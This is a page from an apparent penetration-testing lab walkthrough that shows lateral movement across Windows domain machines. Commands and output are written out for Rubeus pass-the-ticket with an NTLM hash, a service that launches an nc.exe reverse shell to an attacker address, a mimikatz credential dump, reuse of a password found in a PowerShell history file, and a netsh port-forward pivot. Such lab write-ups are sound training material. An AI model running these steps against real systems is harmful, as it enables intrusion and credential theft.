---
layout: default
---


## msp-sqlreport.msp.local 192.168.250.10

From employee machine Impersonate user sqlsvc and access to it-sqlsrv02 machine:

```
PS C:\tools> .\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.local /ntlm:7782d820e5e5952b20b77a2240a03bbc /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 7782d820e5e5952b20b77a2240a03bbc
[*] Building AS-REQ (w/ preauth) for: 'it.gcb.local\sqlsvc'
[*] Using domain controller: 192.168.4.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQ4bDElULkdDQi5MT0NBTKIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMaXQuZ2NiLmxvY2Fso4IEFTCCBBGgAwIBEqEDAgECooIEAwSCA/9PGCLr
      SoF1LqX9V+EUl1xo7LJBdqPziVb2x1eQfhgWYS0H7Hb/cH92QqvDtntix8yQWLBoHBMlti+RbAGPsFhQ
      il0yyIzWhHE5EYXtKDDmfofQ7mzMRCCfOlM00iVf+WLs3+YByOOIvdEnsMMBot2v5udd79L70ypfLOnj
      Nd6ob3CWpHz9wfXnnWd0h69X/zHjBKZo0ksUN5gifwucKyl3UuUDGXnzDXBZHQl9TjBb7nwpQvWjjGgK
      yQLA5PhvJDvw8v2URshzU0YaKweJbixYajK+3hnwsyT1+jx1m00KHMjdo+FNFmWuASJJOKPolixFjqgZ
      o4Uz8cIHh+BXbUz6hLf7w2uAqw1GQq2TfD+wTRpmuFSdDQ7IO9gm9ESZuaQNNKUUpfOhQ7NBONyxinhv
      mZHhfBTK/gSEU84TYCaC1I1k24LkjC3WhPu08HKCjXAoSgwkQQIdO6PGoSF/72fdjmRWBrEkodFXdSO4
      CKBFb18VRHxqKIfM5C5yVwi10rAAKd+B/te2SqziUhrS4mvE5Rb1Nf8Pn9EY/emgoJ6xY4Vfx8JxQrAv
      f8baOmR+zlP24sKNmVuiQtta4ewD9wQEIdy14EIff3HOTXj6fwDRxvcxmF8aeOaSJkVunFAlKDdUohqG
      eGEQgrh2apAp0zftzuMjhxxY3HujkDt2i0ba41pUokLwqIOHuJpA02FmFUkzTal6/couNCr7bi8B7N3s
      pe87mChf0EuLLHzbMLyISWDBMy1TWbJZFfMe1I5VfigrbK+IA/zoIIMp0aYKATgHdLFvYEjb1mlGtpVK
      LccMLLdf84fPOHgnWiEJPjwK7bp5ET8WeVwrP5q6KVA64fjYSvA2BzYPEMTFplSB1c6wvPI2V+RAzXSm
      xQLbMd292DmFWW2vWEUYMAqooyjVHT8srwaR7xNEko/wFT1Bi1cLeyjMND8Rngv/bi2zzEPfOfB6kJWV
      Zr1QO9VT+8UaJFVpdB8mfXg4zpkKEgEDVVs2fS90RjgdfK+CCAQ6hbYJD2/Tg7UmzoUXwr5qI3DuUSjL
      hqZFluBCPtBtIY/rjZEzhbsoAfTcJxahDVR8i0HVWsQ+NVYuZCXYvGVkXAajXewa5AsHTxeoKGTE+SzI
      i2+aRgFcKcEXi/PdIKwIm9/12UCRTBWEWeq/DW24Ig10+MWPEHcw9DHUPqukiq++qUhoE1SRufsJwGO1
      5i8zab0RKo9MEsEsHqUmPmio6N3MVzdzvrGGsFpzqBlKCR+4WAgu5Nu58nDoJt5i+js1ItMbBNWSgBpJ
      xf3N4fCIqQouNtM5sQ3gtjhxjX7iN6I96jrrx5GnDzIF/1zeMX/tHuKdGLw1AMT1fvh0o5b+/GXj/qGj
      gdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBAFMijIstn+0d/U4tiwYU4N
      oQ4bDElULkdDQi5MT0NBTKITMBGgAwIBAaEKMAgbBnNxbHN2Y6MHAwUAQOEAAKURGA8yMDI0MDcxOTEx
      NDExNlqmERgPMjAyNDA3MTkyMTQxMTZapxEYDzIwMjQwNzI2MTE0MTE2WqgOGwxJVC5HQ0IuTE9DQUyp
      ITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGl0LmdjYi5sb2NhbA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/it.gcb.local
  ServiceRealm             :  IT.GCB.LOCAL
  UserName                 :  sqlsvc
  UserRealm                :  IT.GCB.LOCAL
  StartTime                :  7/19/2024 4:41:16 AM
  EndTime                  :  7/19/2024 2:41:16 PM
  RenewTill                :  7/26/2024 4:41:16 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  BTIoyLLZ/tHf1OLYsGFODQ==
  ASREP (key)              :  7782D820E5E5952B20B77A2240A03BBC

PS C:\tools> Enter-PSSession -ComputerName it-sqlsrv02.it.gcb.local
[it-sqlsrv02.it.gcb.local]: PS C:\Users\sqlsvc\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::ceb5:8f46:ff32:c5b1%4
   IPv4 Address. . . . . . . . . . . : 192.168.4.51
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.4.254
```

Create new service on the it-sqlsrv02 machine:
```
[it-sqlsrv02.it.gcb.local]: PS C:\> cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 443"
[SC] CreateService SUCCESS
```

And obtain a new CMD with NT Authority System privileges:

```
PS C:\Users\itemployee15> powercat -l -v -p 443 -t 99999
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [192.168.4.51] port  [tcp] accepted (source port 50350)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>C:\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.local /ntlm:7782d820e5e5952b20b77a2240a03bbc /ptt
C:\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.local /ntlm:7782d820e5e5952b20b77a2240a03bbc /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 7782d820e5e5952b20b77a2240a03bbc
[*] Building AS-REQ (w/ preauth) for: 'it.gcb.local\sqlsvc'
[*] Using domain controller: 192.168.4.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQ4bDElULkdDQi5MT0NBTKIhMB+g
      AwIBAqEYMBYbBmtyYnRndBsMaXQuZ2NiLmxvY2Fso4IEFTCCBBGgAwIBEqEDAgECooIEAwSCA/90FYyA
      JThV9g1acTsN4LovaRsmQSEXG+qtbjySHJN3DYhmM4GKMHvYt+yUjzcmKYgJRoCI5RlDcSd5JgDpVpzq
      d4jkEtURKaXhPyZxXBc1A50iDFUjl53XM3Icl9guKM/8YBVFGT0tP77+HF+vTrwkaFlqL1sf+tQfbRyJ
      75FV0Ib+cnzMAGb30PUXiGYrVzIM0er8c2hFwhF4PsK8nNOoy3D8mIP24VM+5cLy3iAQ9pEnY1WFtswS
      nIvyink7wD0s23J+fHUgCVlEt0OUT6lUARdTPJT8LWjCROY2wx+A69JH2d9kHCospg2ZRhYhYPNgUvV/
      ozTt83B5+7uroEbPOrUAnnEtAeRGGQbtJYJ7YfL6xPFlqqgec4Z6jj7/YHnc2V3pT1MXKQYcqZPqT72T
      RUeBSq7VtWvxK+/+10ZL2UxcNd0/sZzQcy3pRZSU1kCjDIW4Qvrqp6Zbmsg0ZsuCD6vRmtK8KwaYuN+1
      ywkHnMskLoNpBTBZi8menFUTC5hyQ3xB43LQfhTocwq1Li0AbD/j6Qn1tV3ttB1WSBHlGEfqUr4X41n0
      xlnxw/75gACbdQi97K5mzAeBSbv1o8WDNXObx469PlL4gsHB47HF5t/EWNbfPjYKjlpgAtsUNB/JXQ2Q
      GbzTeUmIWnLpcZGxujz4KU3jZMYLuTKzXHj5NUTgr+XJfP44Rc8lZ6TeOkM7shAIZf+dY7OBcZTWGNkg
      alxZV9O9g/tyVWdXNMY/Tq+DBA0NiJZq9IQGu0iwoh0YxiiuO5REvurarBR/TDDU68az8c7AZLR0FBsd
      ErzzQ3VnmJuqr7OeA2GHyhD4G03zlXgZzPUIFe6cX/9x04/0j02d1SKNGsHCUVQcQn5KkDG1HffH5yEK
      GxxjvHHi+f5vasHPwDBEHv5J4aJCM19exsTFGvURRJA44FDhNhml6SDzYdwTEyflbyoBbzGXt+4yJUiH
      R1XORsKHTxlfgMnXgFyJLzejf7xotOOzGzJBICRY7/0lw+Rdzx5gNoplmxLCRbHbnDbK1Gyl823wyVkb
      nBPdiSgq0R/x7IU5DL22HISAt0K+HXcSB/nYHdJvNGRY1Q9P74lTwgkZMokMCAKeKN/tPRaQkyHGcMRG
      v8MCy4Ejf9UJlYhfF4op6eu0siu4YEaxtg+ZefPogb00o2ICQBQLAYtKVrUTXcp/qdDUAGyP/9UJmpCE
      RidOpPU6LKsjwOy2UHctZ8ZVzkBJ7B1jCGNnLOwACqv+bMcFqOZWm0a58ehIKTRgyAAkPuL8Slznwrl4
      U0q0wMHx1BS7RubfA64FUNWs39nQuEMUpJeZzQJ2RyOfRclJ8tNe9GfhFnqh1DAHEWNpkj3qA74LAzaj
      gdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBDsKra7v7SNHdt3WAIOcVmG
      oQ4bDElULkdDQi5MT0NBTKITMBGgAwIBAaEKMAgbBnNxbHN2Y6MHAwUAQOEAAKURGA8yMDI0MDcxOTEx
      NTAwMlqmERgPMjAyNDA3MTkyMTUwMDJapxEYDzIwMjQwNzI2MTE1MDAyWqgOGwxJVC5HQ0IuTE9DQUyp
      ITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGl0LmdjYi5sb2NhbA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/it.gcb.local
  ServiceRealm             :  IT.GCB.LOCAL
  UserName                 :  sqlsvc
  UserRealm                :  IT.GCB.LOCAL
  StartTime                :  7/19/2024 4:50:02 AM
  EndTime                  :  7/19/2024 2:50:02 PM
  RenewTill                :  7/26/2024 4:50:02 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  7Cq2u7+0jR3bd1gCDnFZhg==
  ASREP (key)              :  7782D820E5E5952B20B77A2240A03BBC


```


In order to access to msp-sqlreport it's requiered reuse an extracted credentials from employee user:

```
PS C:\Windows\system32> Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -ep bypass $passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force
powershell -ep bypass $passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force

```

```
winrs.exe -r:msp-sqlreport.msp.local -u:"msp\mspdb" -p:"Vend0r'sDatabaseSecret" cmd
Microsoft Windows [Version 10.0.17763.5458]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\mspdb>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::57e6:b18e:bbb0:5276%5
   IPv4 Address. . . . . . . . . . . : 192.168.250.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.250.254
```

```
PS C:\Users\mspdb> C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 91517 (00000000:0001657d)
Session           : Service from 0
User Name         : mspdb
Domain            : MSP
Logon Server      : MSP-DC01
Logon Time        : 4/28/2024 11:51:09 PM
SID               : S-1-5-21-2998733414-582960673-4099777928-1107
        msv :
         [00000003] Primary
         * Username : mspdb
         * Domain   : MSP
         * NTLM     : 90b1b0e51da0ba63796d66a38c1b67d3
         * SHA1     : 7f0f2ab7a7eec9357b6dca20be951644e7c0cff8
         * DPAPI    : 4625ccd12e8761f23ab55de54181aca2
        tspkg :
        wdigest :
         * Username : mspdb
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : mspdb
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 58539 (00000000:0000e4ab)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:06 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SQLREPORT$
         * Domain   : msp.local
         * Password : 54 f9 1a 31 ba be ee 9a b9 db e7 15 85 23 a1 b0 b8 fc f0 bb 89 f1 ce 21 94 6a 66 e3 36 de c6 e5 c3 c8 0d cd df 1c 46 6e f7 08 aa e6 88 a0 99 5e 95 7e a7 92 77 6b dd 6a 80 11 c1 96 27 3d e9 6e 08 cc a0 1b 12 6a 57 5c c4 51 6d 06 e8 60 40 8e c4 1f 12 ec 09 4d 6a 42 74 1c 64 7d 73 b8 7b 06 b7 06 78 f3 0d 6a 04 f9 f7 dc 18 fb 87 f7 d5 72 7b 66 5a ef ae 0f 34 49 bf df f8 71 c5 61 78 30 fa 70 19 36 00 55 64 1b 2f 3d e3 64 6c f0 09 2a ce 0c 92 c4 4d 15 da 44 bf 2b e6 bf fb 5a 13 89 af 13 31 ad 42 b2 08 94 4d 4f 68 93 94 6b af 5d 84 18 a0 89 dc a3 34 36 a2 54 88 2d c6 1d 76 b2 ed 9b 1b 7d 9e e0 1e db 39 95 10 b7 9c 9a e0 e2 3f 76 34 b3 87 64 1a 7b 6d 41 6e 61 b6 ab 2d fd 5f 2e d7 30 52 8c 35 10 ef 64 76 bd a2 f7 93 99
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MSP-SQLREPORT$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:48 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-sqlreport$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 25157 (00000000:00006245)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:48 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SQLREPORT$
         * Domain   : msp.local
         * Password : 54 f9 1a 31 ba be ee 9a b9 db e7 15 85 23 a1 b0 b8 fc f0 bb 89 f1 ce 21 94 6a 66 e3 36 de c6 e5 c3 c8 0d cd df 1c 46 6e f7 08 aa e6 88 a0 99 5e 95 7e a7 92 77 6b dd 6a 80 11 c1 96 27 3d e9 6e 08 cc a0 1b 12 6a 57 5c c4 51 6d 06 e8 60 40 8e c4 1f 12 ec 09 4d 6a 42 74 1c 64 7d 73 b8 7b 06 b7 06 78 f3 0d 6a 04 f9 f7 dc 18 fb 87 f7 d5 72 7b 66 5a ef ae 0f 34 49 bf df f8 71 c5 61 78 30 fa 70 19 36 00 55 64 1b 2f 3d e3 64 6c f0 09 2a ce 0c 92 c4 4d 15 da 44 bf 2b e6 bf fb 5a 13 89 af 13 31 ad 42 b2 08 94 4d 4f 68 93 94 6b af 5d 84 18 a0 89 dc a3 34 36 a2 54 88 2d c6 1d 76 b2 ed 9b 1b 7d 9e e0 1e db 39 95 10 b7 9c 9a e0 e2 3f 76 34 b3 87 64 1a 7b 6d 41 6e 61 b6 ab 2d fd 5f 2e d7 30 52 8c 35 10 ef 64 76 bd a2 f7 93 99
        ssp :
        credman :

Authentication Id : 0 ; 662602 (00000000:000a1c4a)
Session           : RemoteInteractive from 2
User Name         : mspdb
Domain            : MSP
Logon Server      : MSP-DC01
Logon Time        : 4/29/2024 12:00:47 AM
SID               : S-1-5-21-2998733414-582960673-4099777928-1107
        msv :
         [00000003] Primary
         * Username : mspdb
         * Domain   : MSP
         * NTLM     : 90b1b0e51da0ba63796d66a38c1b67d3
         * SHA1     : 7f0f2ab7a7eec9357b6dca20be951644e7c0cff8
         * DPAPI    : 4625ccd12e8761f23ab55de54181aca2
        tspkg :
        wdigest :
         * Username : mspdb
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : mspdb
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 628080 (00000000:00099570)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:59:46 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SQLREPORT$
         * Domain   : msp.local
         * Password : 54 f9 1a 31 ba be ee 9a b9 db e7 15 85 23 a1 b0 b8 fc f0 bb 89 f1 ce 21 94 6a 66 e3 36 de c6 e5 c3 c8 0d cd df 1c 46 6e f7 08 aa e6 88 a0 99 5e 95 7e a7 92 77 6b dd 6a 80 11 c1 96 27 3d e9 6e 08 cc a0 1b 12 6a 57 5c c4 51 6d 06 e8 60 40 8e c4 1f 12 ec 09 4d 6a 42 74 1c 64 7d 73 b8 7b 06 b7 06 78 f3 0d 6a 04 f9 f7 dc 18 fb 87 f7 d5 72 7b 66 5a ef ae 0f 34 49 bf df f8 71 c5 61 78 30 fa 70 19 36 00 55 64 1b 2f 3d e3 64 6c f0 09 2a ce 0c 92 c4 4d 15 da 44 bf 2b e6 bf fb 5a 13 89 af 13 31 ad 42 b2 08 94 4d 4f 68 93 94 6b af 5d 84 18 a0 89 dc a3 34 36 a2 54 88 2d c6 1d 76 b2 ed 9b 1b 7d 9e e0 1e db 39 95 10 b7 9c 9a e0 e2 3f 76 34 b3 87 64 1a 7b 6d 41 6e 61 b6 ab 2d fd 5f 2e d7 30 52 8c 35 10 ef 64 76 bd a2 f7 93 99
        ssp :
        credman :

Authentication Id : 0 ; 91550 (00000000:0001659e)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:08 PM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : MSP-SQLREPORT$
         * Domain   : msp.local
         * Password : 54 f9 1a 31 ba be ee 9a b9 db e7 15 85 23 a1 b0 b8 fc f0 bb 89 f1 ce 21 94 6a 66 e3 36 de c6 e5 c3 c8 0d cd df 1c 46 6e f7 08 aa e6 88 a0 99 5e 95 7e a7 92 77 6b dd 6a 80 11 c1 96 27 3d e9 6e 08 cc a0 1b 12 6a 57 5c c4 51 6d 06 e8 60 40 8e c4 1f 12 ec 09 4d 6a 42 74 1c 64 7d 73 b8 7b 06 b7 06 78 f3 0d 6a 04 f9 f7 dc 18 fb 87 f7 d5 72 7b 66 5a ef ae 0f 34 49 bf df f8 71 c5 61 78 30 fa 70 19 36 00 55 64 1b 2f 3d e3 64 6c f0 09 2a ce 0c 92 c4 4d 15 da 44 bf 2b e6 bf fb 5a 13 89 af 13 31 ad 42 b2 08 94 4d 4f 68 93 94 6b af 5d 84 18 a0 89 dc a3 34 36 a2 54 88 2d c6 1d 76 b2 ed 9b 1b 7d 9e e0 1e db 39 95 10 b7 9c 9a e0 e2 3f 76 34 b3 87 64 1a 7b 6d 41 6e 61 b6 ab 2d fd 5f 2e d7 30 52 8c 35 10 ef 64 76 bd a2 f7 93 99
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:51:07 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 23337 (00000000:00005b29)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:48 PM
SID               :
        msv :
         [00000003] Primary
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * NTLM     : 021a4640a3f12d115ac4db759708fd4c
         * SHA1     : dd5b6a801bce1f576eb596b67f124d0d87adb297
         * DPAPI    : dd5b6a801bce1f576eb596b67f124d0d
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MSP-SQLREPORT$
Domain            : MSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:48 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MSP-SQLREPORT$
         * Domain   : MSP
         * Password : (null)
        kerberos :
         * Username : msp-sqlreport$
         * Domain   : MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list
ERROR kuhl_m_vault_list ; VaultEnumerateVaults : 0x80090345

mimikatz(commandline) # vault::cred /patch

mimikatz(commandline) # exit
Bye!
```

Enable portforwarding for access to msp-srv01:

```
PS C:\Users\mspdb>  netsh interface portproxy add v4tov4 listenport=443 listenAddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22

 netsh interface portproxy add v4tov4 listenport=443 listenAddress=0.0.0.0 connectport=443 connectaddress=192.168.250.22

```


[back](./section1.html)